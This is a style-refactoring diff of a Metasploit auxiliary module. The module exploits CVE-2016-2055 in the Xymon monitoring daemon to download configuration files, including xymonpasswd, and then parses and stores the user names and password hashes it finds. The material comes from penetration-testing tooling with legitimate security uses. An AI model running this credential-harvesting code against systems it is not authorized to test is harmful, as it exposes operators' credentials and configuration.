@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Xymon Daemon Gather Information',
+      'Name' => 'Xymon Daemon Gather Information',
       'Description' => %q{
         This module retrieves information from a Xymon daemon service
         (formerly Hobbit, based on Big Brother), including server
@@ -21,20 +21,19 @@ class MetasploitModule < Msf::Auxiliary
         which permit download arbitrary config files (CVE-2016-2055),
         and servers configured with `ALLOWALLCONFIGFILES` enabled.
       },
-      'Author'      => [
+      'Author' => [
         'Markus Krell', # CVE-2016-2055 discovery
         'bcoles'        # Metasploit
       ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          ['CVE', '2016-2055'],
-          ['PACKETSTORM', '135758'],
-          ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],
-          ['URL', 'https://xymon.sourceforge.net/'],
-          ['URL', 'https://en.wikipedia.org/wiki/Xymon'],
-          ['URL', 'https://en.wikipedia.org/wiki/Big_Brother_(software)']
-        ]
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2016-2055'],
+        ['PACKETSTORM', '135758'],
+        ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],
+        ['URL', 'https://xymon.sourceforge.net/'],
+        ['URL', 'https://en.wikipedia.org/wiki/Xymon'],
+        ['URL', 'https://en.wikipedia.org/wiki/Big_Brother_(software)']
+      ]
     )
     register_options [Opt::RPORT(1984)]
   end
@@ -57,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    version = res.scan(/^xymond ([\d\.]+)/).flatten.first
+    version = res.scan(/^xymond ([\d.]+)/).flatten.first
 
     unless version
       print_error 'Could not retrieve Xymon version'
@@ -78,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status 'Retrieving configuration files ...'
 
-    %w(xymonserver.cfg hosts.cfg xymonpasswd).each do |config|
+    %w[xymonserver.cfg hosts.cfg xymonpasswd].each do |config|
       res = xymon_send("config #{config}").to_s
 
       if res.blank?
@@ -98,29 +97,29 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good "#{config} (#{res.size} bytes) stored in #{path}"
 
-      if config == 'xymonpasswd'
-        res.each_line.map {|l| l.strip}.reject{|l| l.blank? || l.starts_with?('#')}.each do |c|
-          user = c.split(':')[0].to_s.strip
-          hash = c.split(':')[1].to_s.strip
+      next unless config == 'xymonpasswd'
 
-          print_good("Credentials: #{user} : #{hash}")
+      res.each_line.map(&:strip).reject { |l| l.blank? || l.starts_with?('#') }.each do |c|
+        user = c.split(':')[0].to_s.strip
+        hash = c.split(':')[1].to_s.strip
 
-          credential_data = {
-            module_fullname: fullname,
-            origin_type: :service,
-            private_data: hash,
-            private_type: :nonreplayable_hash,
-            jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
-            username: user
-          }.merge(service_data)
+        print_good("Credentials: #{user} : #{hash}")
 
-          login_data = {
-            core: create_credential(credential_data),
-            status: Metasploit::Model::Login::Status::UNTRIED
-          }.merge(service_data)
+        credential_data = {
+          module_fullname: fullname,
+          origin_type: :service,
+          private_data: hash,
+          private_type: :nonreplayable_hash,
+          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
+          username: user
+        }.merge(service_data)
 
-          create_credential_login(login_data)
-        end
+        login_data = {
+          core: create_credential(credential_data),
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }.merge(service_data)
+
+        create_credential_login(login_data)
       end
     end
 
@@ -145,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good "Host info (#{res.size} bytes) stored in #{path}"
 
-    hosts = res.each_line.map {|line| line.split('|').first}.reject {|host| host.blank?}
+    hosts = res.each_line.map { |line| line.split('|').first }.reject(&:blank?)
 
     if hosts.empty?
       print_error 'Found no client hosts'
